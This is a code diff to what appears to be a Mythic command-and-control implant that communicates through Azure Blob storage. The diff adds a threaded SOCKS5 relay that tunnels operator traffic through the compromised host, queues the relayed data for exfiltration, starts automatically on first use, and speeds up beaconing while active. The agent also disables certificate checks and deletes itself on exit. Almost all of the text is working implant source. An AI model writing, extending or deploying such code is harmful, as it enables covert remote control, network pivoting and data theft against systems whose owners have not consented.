@@ -17,6 +17,8 @@ import signal
 import datetime
 import ctypes
 import select
+import queue
+import threading
 
 BLOB_ENDPOINT = "BLOB_ENDPOINT_PLACEHOLDER"
 CONTAINER_NAME = "CONTAINER_NAME_PLACEHOLDER"
@@ -47,9 +49,13 @@ class AzureBlobAgent:
         self.ssl_context.verify_mode = ssl.CERT_NONE
         self._max_retries = 3
         self._retry_base_delay = 2
-        # SOCKS proxy state: server_id -> socket
-        self._socks_connections = {}
-        self._socks_out = []
+        # SOCKS proxy state
+        self._socks_connections = {}    # server_id -> connected socket
+        self._socks_sendq = {}          # server_id -> Queue (mythic -> target)
+        self._socks_out = queue.Queue()  # packets destined for Mythic
+        self._socks_in = queue.Queue()   # packets received from Mythic
+        self._socks_running = False
+        self._socks_thread = None
 
     # -- Evasion -----------------------------------------------------------
 
@@ -278,7 +284,9 @@ class AzureBlobAgent:
             time.sleep(self.get_sleep_time())
             response = self.get_blob(f"sta/{message_id}.blob")
         decoded = base64.b64decode(response).decode()
-        parsed = json.loads(decoded[36:])
+        if not decoded.lstrip().startswith("{"):
+            decoded = decoded[36:]
+        parsed = json.loads(decoded)
         self.delete_blob(f"sta/{message_id}.blob")
         return parsed
 
@@ -364,8 +372,9 @@ class AzureBlobAgent:
         return {"user_output": socket.gethostname()}
 
     def _cmd_exit(self, task):
+        # os._exit avoids SystemExit escaping the main-loop handler
         self._self_delete()
-        sys.exit(0)
+        os._exit(0)
 
     def _cmd_ls(self, task):
         params = self._parse_params(task)
@@ -755,162 +764,173 @@ class AzureBlobAgent:
 
     # -- SOCKS5 proxy engine -----------------------------------------------
 
-    def _socks_connect(self, server_id, data):
-        """Parse SOCKS5 connect request, establish TCP connection, queue response."""
-        try:
-            if len(data) < 4:
-                self._socks_send_error(server_id)
-                return
-            ver = data[0]
-            cmd = data[1]
-            # ver must be 5, cmd must be 1 (CONNECT)
-            if ver != 0x05 or cmd != 0x01:
-                self._socks_send_error(server_id)
-                return
-            atyp = data[3]
-            if atyp == 0x01:  # IPv4
-                if len(data) < 10:
-                    self._socks_send_error(server_id)
-                    return
-                addr = socket.inet_ntoa(data[4:8])
-                port = struct.unpack("!H", data[8:10])[0]
-            elif atyp == 0x03:  # Domain
-                dlen = data[4]
-                if len(data) < 5 + dlen + 2:
-                    self._socks_send_error(server_id)
-                    return
-                addr = data[5:5 + dlen].decode("utf-8", errors="replace")
-                port = struct.unpack("!H", data[5 + dlen:7 + dlen])[0]
-            elif atyp == 0x04:  # IPv6
-                if len(data) < 22:
-                    self._socks_send_error(server_id)
-                    return
-                addr = socket.inet_ntop(socket.AF_INET6, data[4:20])
-                port = struct.unpack("!H", data[20:22])[0]
-            else:
-                self._socks_send_error(server_id)
-                return
-
-            # Establish TCP connection to target
-            if atyp == 0x04:
-                sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
-            else:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(10)
-            sock.connect((addr, port))
-            sock.setblocking(False)
-            self._socks_connections[server_id] = sock
-
-            # SOCKS5 success response: ver=5, rep=0, rsv=0, atyp=1, bind 0.0.0.0:0
-            reply = b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00"
-            self._socks_out.append({
-                "server_id": server_id,
-                "data": base64.b64encode(reply).decode(),
-                "exit": False,
-            })
-        except Exception:
-            self._socks_send_error(server_id)
-
-    def _socks_send_error(self, server_id):
-        """Queue a SOCKS5 connection-refused reply + close."""
-        reply = b"\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00"
-        self._socks_out.append({
+    def _socks_send_packet(self, server_id, data, exit_value):
+        """Queue a packet to be delivered to Mythic on the next beacon."""
+        self._socks_out.put({
             "server_id": server_id,
-            "data": base64.b64encode(reply).decode(),
-            "exit": True,
+            "data": base64.b64encode(data).decode(),
+            "exit": exit_value,
         })
-        self._socks_close(server_id)
 
     def _socks_close(self, server_id):
-        """Close and remove a SOCKS connection."""
+        """Tear down a SOCKS connection and its send queue."""
         sock = self._socks_connections.pop(server_id, None)
-        if sock:
+        self._socks_sendq.pop(server_id, None)
+        if sock is not None:
             try:
                 sock.close()
             except Exception:
                 pass
 
-    def _socks_process_from_server(self, socks_data):
-        """Handle SOCKS messages from Mythic (connect requests, data, exits)."""
-        for msg in socks_data:
-            server_id = msg.get("server_id", 0)
-            raw = base64.b64decode(msg.get("data", "")) if msg.get("data") else b""
-            exit_flag = msg.get("exit", False)
-
-            if exit_flag:
-                self._socks_close(server_id)
-                continue
-
-            if server_id not in self._socks_connections:
-                # New connection: parse SOCKS5 connect request
-                if raw:
-                    self._socks_connect(server_id, raw)
-            else:
-                # Existing connection: forward data to target
-                if raw:
-                    sock = self._socks_connections.get(server_id)
-                    if sock:
-                        try:
-                            sock.sendall(raw)
-                        except Exception:
-                            self._socks_close(server_id)
-                            self._socks_out.append({
-                                "server_id": server_id,
-                                "data": "",
-                                "exit": True,
-                            })
-
-    def _socks_gather(self):
-        """Read available data from all active SOCKS connections."""
-        dead = []
-        if not self._socks_connections:
-            result = list(self._socks_out)
-            self._socks_out.clear()
-            return result
-
-        readable_socks = list(self._socks_connections.keys())
-        sock_list = [self._socks_connections[sid] for sid in readable_socks]
-
+    def _socks_create_connection(self, pkt):
+        """Parse a SOCKS5 CONNECT request, dial the target, send the reply."""
+        server_id = pkt.get("server_id")
         try:
-            readable, _, errored = select.select(sock_list, [], sock_list, 0.1)
+            msg = base64.b64decode(pkt.get("data", ""))
         except Exception:
-            readable, errored = [], []
+            return None
+        # VER=5, CMD=1 (CONNECT), RSV=0
+        if len(msg) < 4 or msg[0:1] != b"\x05" or msg[1:2] != b"\x01":
+            self._socks_send_packet(
+                server_id, b"\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00", True)
+            return None
+        atyp = msg[3:4]
+        if atyp == b"\x01" and len(msg) >= 10:
+            addr = socket.inet_ntoa(msg[4:8])
+            port = struct.unpack(">H", msg[8:10])[0]
+        elif atyp == b"\x03" and len(msg) >= 5:
+            dlen = msg[4]
+            if len(msg) < 5 + dlen + 2:
+                self._socks_send_packet(
+                    server_id, b"\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00", True)
+                return None
+            addr = msg[5:5 + dlen].decode("utf-8", errors="replace")
+            port = struct.unpack(">H", msg[5 + dlen:7 + dlen])[0]
+        elif atyp == b"\x04" and len(msg) >= 22:
+            addr = socket.inet_ntop(socket.AF_INET6, msg[4:20])
+            port = struct.unpack(">H", msg[20:22])[0]
+        else:
+            self._socks_send_packet(
+                server_id, b"\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00", True)
+            return None
 
-        readable_set = set(id(s) for s in readable)
-        errored_set = set(id(s) for s in errored)
-
-        for sid in readable_socks:
-            sock = self._socks_connections.get(sid)
-            if not sock:
-                continue
-            if id(sock) in errored_set:
-                dead.append(sid)
-                continue
-            if id(sock) in readable_set:
+        rep = b"\x01"                                  # general failure
+        bnd = b"\x00\x00\x00\x00\x00\x00"
+        sock = None
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(10)
+            sock.connect((addr, port))
+            sock.settimeout(None)
+            sock.setblocking(False)
+            rep = b"\x00"
+            try:
+                local = sock.getsockname()
+                bnd = socket.inet_aton(local[0]) + struct.pack(">H", local[1])
+            except Exception:
+                pass
+        except Exception:
+            if sock is not None:
                 try:
-                    chunk = sock.recv(65536)
-                    if chunk:
-                        self._socks_out.append({
-                            "server_id": sid,
-                            "data": base64.b64encode(chunk).decode(),
-                            "exit": False,
-                        })
-                    else:
-                        dead.append(sid)
+                    sock.close()
                 except Exception:
-                    dead.append(sid)
+                    pass
+            sock = None
+        # reply: VER REP RSV ATYP BND.ADDR BND.PORT
+        self._socks_send_packet(server_id, b"\x05" + rep + b"\x00\x01" + bnd, False)
+        return sock if rep == b"\x00" else None
 
-        for sid in dead:
+    def _socks_a2m(self, server_id, sock):
+        """Agent -> Mythic: read from target, queue for exfil."""
+        while self._socks_running and server_id in self._socks_connections:
+            try:
+                r, _, _ = select.select([sock], [], [], 0.5)
+            except Exception:
+                break
+            if not r:
+                continue
+            try:
+                data = sock.recv(65536)
+            except BlockingIOError:
+                continue
+            except Exception:
+                break
+            if not data:
+                self._socks_send_packet(server_id, b"", True)
+                break
+            self._socks_send_packet(server_id, data, False)
+        self._socks_close(server_id)
+
+    def _socks_m2a(self, server_id, sock):
+        """Mythic -> Agent: forward client bytes to the target."""
+        while self._socks_running and server_id in self._socks_connections:
+            q = self._socks_sendq.get(server_id)
+            if q is None:
+                break
+            try:
+                b64 = q.get(timeout=0.5)
+            except queue.Empty:
+                continue
+            try:
+                payload = base64.b64decode(b64)
+                if payload:
+                    sock.sendall(payload)
+            except Exception:
+                break
+        self._socks_close(server_id)
+
+    def _socks_worker(self):
+        """Long-lived consumer of inbound SOCKS packets."""
+        while self._socks_running:
+            try:
+                pkt = self._socks_in.get(timeout=0.5)
+            except queue.Empty:
+                continue
+            if not pkt:
+                continue
+            server_id = pkt.get("server_id")
+            if server_id in self._socks_connections:
+                if pkt.get("data"):
+                    q = self._socks_sendq.get(server_id)
+                    if q is not None:
+                        q.put(pkt["data"])
+                elif pkt.get("exit"):
+                    self._socks_close(server_id)
+            else:
+                if not pkt.get("exit"):
+                    sock = self._socks_create_connection(pkt)
+                    if sock is not None:
+                        self._socks_connections[server_id] = sock
+                        self._socks_sendq[server_id] = queue.Queue()
+                        threading.Thread(
+                            target=self._socks_a2m, args=(server_id, sock),
+                            name="a2m:%s" % server_id, daemon=True).start()
+                        threading.Thread(
+                            target=self._socks_m2a, args=(server_id, sock),
+                            name="m2a:%s" % server_id, daemon=True).start()
+
+    def _start_socks_worker(self):
+        """Idempotently spin up the SOCKS relay worker thread."""
+        if self._socks_running:
+            return False
+        self._socks_running = True
+        self._socks_thread = threading.Thread(
+            target=self._socks_worker, name="socks", daemon=True)
+        self._socks_thread.start()
+        return True
+
+    def _cmd_socks(self, task):
+        params = self._parse_params(task)
+        action = params.get("action", "start")
+        if action == "start":
+            if not self._start_socks_worker():
+                return {"user_output": "[!] SOCKS proxy already running."}
+            return {"user_output": "[*] SOCKS proxy started."}
+        self._socks_running = False
+        for sid in list(self._socks_connections.keys()):
             self._socks_close(sid)
-            self._socks_out.append({
-                "server_id": sid,
-                "data": "",
-                "exit": True,
-            })
-
-        result = list(self._socks_out)
-        self._socks_out.clear()
-        return result
+        self._socks_thread = None
+        return {"user_output": "[*] SOCKS proxy stopped."}
 
     # -- Task dispatch -----------------------------------------------------
 
@@ -939,6 +959,7 @@ class AzureBlobAgent:
             "sysinfo": self._cmd_sysinfo,
             "kill": self._cmd_kill,
             "screenshot": self._cmd_screenshot,
+            "socks": self._cmd_socks,
         }
 
         response = {
@@ -1002,12 +1023,19 @@ class AzureBlobAgent:
                     for task in data["tasks"]:
                         resp = self.execute_task(task)
                         responses.append(resp)
-                # Process SOCKS data from Mythic
+                # Queue any SOCKS traffic Mythic sent down. If Mythic opened the
+                # proxy directly (callback-table button) the agent may never have
+                # seen a socks task, so start the relay lazily on first packet.
                 if "socks" in data and data["socks"]:
-                    self._socks_process_from_server(data["socks"])
-                # Gather pending SOCKS data from active connections
-                socks_out = self._socks_gather()
-                # Post responses and/or SOCKS data
+                    if not self._socks_running:
+                        self._start_socks_worker()
+                    for pkt in data["socks"]:
+                        self._socks_in.put(pkt)
+                # Drain SOCKS packets produced by the relay threads
+                socks_out = []
+                while not self._socks_out.empty():
+                    socks_out.append(self._socks_out.get())
+                # Post task responses and/or SOCKS traffic
                 if responses or socks_out:
                     msg = self.build_post_response(responses)
                     if socks_out:
@@ -1015,9 +1043,10 @@ class AzureBlobAgent:
                     self.postMessageAndRetrieveResponseBlob(msg)
             except Exception:
                 pass
-            # Adaptive beaconing: fast poll when SOCKS connections are active
-            if self._socks_connections:
-                time.sleep(max(1, min(2, self.callback_interval // 10)))
+            # Adaptive beaconing: while a SOCKS proxy is up, poll fast so the
+            # tunnel stays responsive (Azure Blob polling is the bottleneck).
+            if self._socks_running or self._socks_connections:
+                time.sleep(1)
             else:
                 time.sleep(self.get_sleep_time())
 
